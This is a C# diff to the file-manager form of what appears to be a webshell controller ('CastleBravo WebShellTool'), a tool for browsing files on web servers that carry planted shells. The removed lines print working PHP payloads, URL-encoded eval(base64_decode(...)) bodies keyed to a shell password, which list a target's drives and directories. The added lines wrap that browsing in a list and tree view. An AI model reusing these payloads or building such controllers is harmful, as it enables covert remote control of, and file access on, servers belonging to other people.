@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
@@ -17,12 +18,13 @@ namespace C2.Business.CastleBravo.WebShellTool
     {
         private WebShellTaskInfo webShellTaskInfo;
         private WebShell webShell;
-        private List<WSFile> filesInCurrentFolder = new List<WSFile>();
-        private List<WSFolder> foldersInCurrentFolder = new List<WSFolder>();
+
+        private string currentShowPath;
 
         public WebShellDetails()
         {
             InitializeComponent();
+            currentShowPath = string.Empty;
         }
 
         public WebShellDetails(WebShellTaskInfo taskInfo) : this()
@@ -34,78 +36,105 @@ namespace C2.Business.CastleBravo.WebShellTool
         private void TabControl1_SelectedIndexChanged(object sender, EventArgs e)
         {
             if (tabControl1.SelectedTab.Text == "文件管理")
-                UpdateFileManager();
+                UpdateFileManager(webShell.CurrentPathBrowse());
         }
 
-        private void UpdateFileManager()
+        private void FilePathTb_KeyDown(object sender, KeyEventArgs e)
         {
+            if (e.KeyCode == Keys.Enter)
+            {
+                UpdateFileManager(webShell.PathBrowse(this.filePathTb.Text));
+            }
+        }
+
+        private void FileManagerListView_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            if (this.fileManagerListView.SelectedItems.Count == 0)
+                return;
+
+            WSFile selectedFile = (WSFile)this.fileManagerListView.SelectedItems[0].Tag;
+            if (selectedFile.Type != WebShellFileType.Directory)
+                return;
+
+            //TODO linux和windows拼接不一样，用path.combine拼不了linux路径？
+            UpdateFileManager(webShell.PathBrowse(currentShowPath + "/" + selectedFile.FileName)); 
+        }
+
+        private void UpdateFileManager(Tuple<string, List<WSFile>> pathFiles)
+        {
+            string path = pathFiles.Item1;
+            List<WSFile> files = pathFiles.Item2;
+
+            //更新textbox显示路径
+            currentShowPath = this.filePathTb.Text = path;
+
+            //更新右侧listview
+            this.fileManagerListView.Items.Clear();
+            foreach (WSFile file in files)
+            {
+                ListViewItem lvi = new ListViewItem();
+                lvi.Tag = file;
+                lvi.Text = file.FileName;
+                lvi.ImageIndex = file.Type == WebShellFileType.Directory ? 0 : 1;
+                lvi.SubItems.Add(file.CreateTime);
+                lvi.SubItems.Add(file.FileSize);
+                lvi.SubItems.Add(file.LastMod);
+
+                this.fileManagerListView.Items.Add(lvi);
+            }
+
+            //更新左侧treeview
             /*
-             * TODO
-             *  1、发报文查询
-             *  2、结果解析
-             *  3、界面展示
+             * 更新逻辑【先清空吧，后面再调整】
+             * 1、首先肯定能拿到path
+             * 2、对path进行解析，用 / 切分，展示为树的一条完整分支
+             * 3、该路径下的所有文件夹，添加到子孩子
              */
-            WebClient client = new WebClient();
+            this.treeView1.Nodes.Clear();
 
-            byte[] postData = Encoding.UTF8.GetBytes(webShellTaskInfo.TaskPwd + "=%40ini_set(%22display_errors%22%2c%220%22)%3b%0d%0a%40set_time_limit(0)%3b%0d%0a%40set_magic_quotes_runtime(0)%3b%0d%0aprint(%22-%3e%7c%22)%3b%0d%0aeval(base64_decode(%24_POST%5bz%5d))%3b%0d%0aprint(%22%7c%3c-%22)%3b%0d%0adie()%3b&z=JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pOw0KaWYoJEQ9PSIiKSAkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7DQokUj0ieyREfVx0IjsNCmlmKHN1YnN0cigkRCwwLDEpIT0iLyIpDQp7DQoJZm9yZWFjaChyYW5nZSgiQSIsIloiKSBhcyAkTCkNCgkJaWYoaXNfZGlyKCJ7JEx9OiIpKQ0KCQkJJFIuPSJ7JEx9OiAiOw0KfQ0KZWxzZSAkUi49Ii8iOw0KcHJpbnQgJFI7");
-            client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-            byte[] responseData = client.UploadData(webShellTaskInfo.TaskUrl, "POST", postData);//得到返回字符流  
-            string result = Encoding.UTF8.GetString(responseData);//解码 
+            TreeNode root = new TreeNode();
+            root.Name = "/";
+            root.Text = "/";
+            root.Tag = "/";
+            root.ImageIndex = 4;
+            this.treeView1.Nodes.Add(root);
 
-            string pattern = @"->\|(?<Result>.*)\|<-";
-            Regex regex = new Regex(pattern, RegexOptions.Singleline);
-            Match m = regex.Match(result);
-            if (m.Success)
+            TreeNode tmpNode = root;
+
+            foreach (string dir in path.Trim('/').Split('/'))
             {
-                string tmpPath = m.Groups["Result"].Value.TrimEnd(new char[] { '/', ' ', '\t'}) + '/';
+                TreeNode dirNode = new TreeNode();
+                dirNode.Name = dir;
+                dirNode.Text = dir;
+                dirNode.Tag = tmpNode.Tag + "/" + dir;
+                dirNode.ImageIndex = 0;
 
-                var bPath = System.Text.Encoding.UTF8.GetBytes(tmpPath);
-                string path = System.Convert.ToBase64String(bPath);
-
-                client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
-                byte[] postData2 = Encoding.UTF8.GetBytes(webShellTaskInfo.TaskPwd + "=%40ini_set(%22display_errors%22%2c%220%22)%3b%0d%0a%40set_time_limit(0)%3b%0d%0a%40set_magic_quotes_runtime(0)%3b%0d%0aprint(%22-%3e%7c%22)%3b%0d%0aeval(base64_decode(%24_POST%5bf%5d))%3b%0d%0aprint(%22%7c%3c-%22)%3b%0d%0adie()%3b&f=JEQ9YmFzZTY0X2RlY29kZSgkX1BPU1RbImIiXSk7DQokZj1Ab3BlbmRpcigkRCk7DQppZiAoJGY9PU5VTEwpIHsNCiAgICBwcmludCgiRVJST1I6Ly9QYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uIik7DQp9DQplbHNlIHsNCiAgICAkTT1OVUxMOw0KICAgICRMPU5VTEw7DQogICAgd2hpbGUgKCROPUByZWFkZGlyKCRmKSkgew0KICAgICAgICBpZiAoJE4gIT0gJy4nICYmICROICE9ICcuLicpIHsNCiAgICAgICAgICAgICRQPSRELicvJy4kTjsNCiAgICAgICAgICAgICRUPUBkYXRlKCdZLW0tZCBIOmk6cycsZmlsZW10aW1lKCRQKSk7DQogICAgICAgICAgICAkUz1Ac3ByaW50ZignJXUnLCBAZmlsZXNpemUoJFApKTsNCiAgICAgICAgICAgICRFPUBzdWJzdHIoYmFzZV9jb252ZXJ0KEBmaWxlcGVybXMoJFApLDEwLDgpLC00KTsNCiAgICAgICAgICAgIGlmIChAaXNfZGlyKCRQKSkgJE4uPScvJzsNCiAgICAgICAgICAgICRNLj0kTi4iXHQiLiRULiJcdCIuJFMuIlx0Ii4kRS4iXG4iOw0KICAgICAgICB9DQogICAgfQ0KICAgIHByaW50ICRNOw0KICAgIEBjbG9zZWRpcigkZik7DQp9&b=" + HttpUtility.UrlEncode(path));
-                byte[] responseData2 = client.UploadData(webShellTaskInfo.TaskUrl, "POST", postData2);
-                string result2 = Encoding.UTF8.GetString(responseData2);//解码 
-                MessageBox.Show(result2);
+                tmpNode.Nodes.Add(dirNode);
+                tmpNode = dirNode;
             }
 
+            foreach (WSFile file in files)
+            {
+                if (file.Type != WebShellFileType.Directory)
+                    continue;
 
+                TreeNode dirNode = new TreeNode();
+                dirNode.Name = file.FileName;
+                dirNode.Text = file.FileName;
+                dirNode.Tag = tmpNode.Tag + "/" + file.FileName;
+                dirNode.ImageIndex = 0;
+
+                tmpNode.Nodes.Add(dirNode);
+            }
+
+            root.ExpandAll();
         }
 
-
-        private void ListFiles(String path)
+        private void TreeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
         {
-            fileManagerListView.Items.Clear();
-            Tuple<List<WSFolder>, List<WSFile>, string> data = webShell.browse(path);
-            filePathTb.Text = data.Item3; //set the realpath
-            this.foldersInCurrentFolder = data.Item1;
-            this.filesInCurrentFolder = data.Item2;
-
-            foreach (WSFolder oneFolder in data.Item1)
+            if (e.Button == MouseButtons.Left)
             {
-                ListViewItem lvi = new ListViewItem(new string[] { oneFolder.name, "0", "", oneFolder.permisions });
-                lvi.ImageIndex = 0;
-                lvi.Tag = "folder";
-                lvi.Name = oneFolder.name;
-                fileManagerListView.Items.Add(lvi);
-            }
-
-            foreach (WSFile oneFile in data.Item2)
-            {
-                ListViewItem lvi = new ListViewItem(new string[] { oneFile.name, oneFile.size, oneFile.lastMod, oneFile.permisions });
-                lvi.ImageIndex = 1;
-                lvi.Tag = "file";
-                lvi.Name = oneFile.name;
-                fileManagerListView.Items.Add(lvi);
-
-                for (int i = 0; i < imageList1.Images.Count; i++) // set image with mime type
-                {
-                    if (oneFile.type.Contains(imageList1.Images.Keys[i].ToString()))
-                    {
-                        lvi.ImageIndex = i;
-                        break;
-                    }
-                }
+                UpdateFileManager(webShell.PathBrowse(e.Node.Tag.ToString()));
             }
         }
     }
